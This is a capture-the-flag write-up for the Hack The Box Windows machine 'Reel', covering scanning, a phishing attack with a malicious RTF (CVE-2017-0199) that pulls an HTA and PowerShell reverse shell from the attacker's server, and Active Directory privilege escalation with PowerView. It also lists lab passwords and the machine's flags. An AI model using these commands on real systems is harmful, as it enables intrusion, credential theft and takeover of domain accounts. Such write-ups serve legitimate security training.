```json
Alias: Reel
Date: 06-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.129.251.106
```

# Reel
# Summary

- Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.

# Used Tools

* cve-2017-0199_toolkit.py
* nishang
* sendEmail
* PowerView
 
---

# Information Gathering
## NMAP
```
# Nmap 7.95 scan initiated Tue Aug  6 10:53:20 2024 as: nmap -sC -sV -oA nmap -Pn 10.129.250.108
Nmap scan report for 10.129.250.108
Host is up (0.23s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.95%I=7%D=8/6%Time=66B1BA63%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-06T05:56:27
|_  start_date: 2024-08-06T05:51:02
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2024-08-06T06:56:30+01:00
|_clock-skew: mean: -19m59s, deviation: 34m35s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  6 10:57:12 2024 -- 1 IP address (1 host up) scanned in 231.97 seconds
```
## Discovered Subdomains
```
HTB.LOCAL
```

---
# Enumeration
FTP contains documents directory which has a few files. The Applocker.docx indicates that hashing rules are enabled. That means Applocker will accept or deny execution of exe, msi and scripts (ps1,vbs,cmd,bat,js) based on their hashes. Most likely only a few selected hashes are allowed.

The readme.txt contains
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```
Which indicates this is a client side attack.

The Final docx contains text That indicates that a collector server is running on 
'http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60'

Start by reading the docx metadata with exiftool to get the user 'nico@megabank.com'

Get this POC 'https://github.com/bhdresh/CVE-2017-0199' That generates a malicious RTF

```bash
python2 cve-2017-0199_toolkit.py -M gen -w exp.rtf -u http://10.10.14.103:8000/temp/exp.hta -t RTF -x 0
```

Use Out-HTA from nishang to generate the malicious HTA.

```powershell
Out-HTA -PayloadURL http://10.10.14.103:8000/temp/exp.ps1
```

Setup the exp.ps1 reverse shell and start a listener

Setup a http server.
```python
python3 -m http.server
```

Use sendEmail to send the email to nico

```bash
sendEmail -t nico@megabank.com -f me@megabank.com -s $IP -u RTF -m "Poo Poo" -a exp.rtfq
```

Nico will recieve the rtf, inspect it, at which moment the rtf will request for the HTA on our webserver and load it. Then the HTA will request for and execute the powershell script of our choice.

![[Pasted image 20240806162216.png]]

---

# Lateral Movement

After getting the reverse shell, list contents of Desktop to find a credential file.
Create a PSCredential Object using it

```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | ConvertTo-SecureString
$user = "HTB\Tom"
$Cred = New-Object System.Management.Automation.PSCredential($user, $pass)
$Cred.GetNetworkCredential() | fl
```

And get the Credential for TOM

| Username | Password     |
| -------- | ------------ |
| Tom      | 1ts-mag1c!!! |

---

# Privilege Escalation

Use Sharphound to collect data, inspect in bloodhound and you will find a path to Backup_Admins from both nico and tom. Import PowerView and follow the bellow path.

```powershell
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
-Verbose
$UserPassword = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force -Verbose
Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword -Verbose
$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $UserPassword)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $Cred
```

After logging in as Claire, it seems that membership of the “Backup_Admins” group provides
access to the Administrator profile, and the Backup Scripts folder. Cleartext Domain
Administrator credentials have been stored in “BackupScript.ps1”. A shell as the Domain
Administrator and the root flag can now be obtained.

| Username      | Administrator    |
| ------------- | ---------------- |
| administrator | Cr4ckMeIfYouC4n! |


---

# Flags
- e34eb78e17043b2af02e25b2b509bb4b
- 7f00b17fc80eabff54d9a0175c0ae4f3

#CTF #CTF/Hackthebox #CTF/Hackthebox/Hard  #CTF/ClientSide #Windows #ActiveDirectory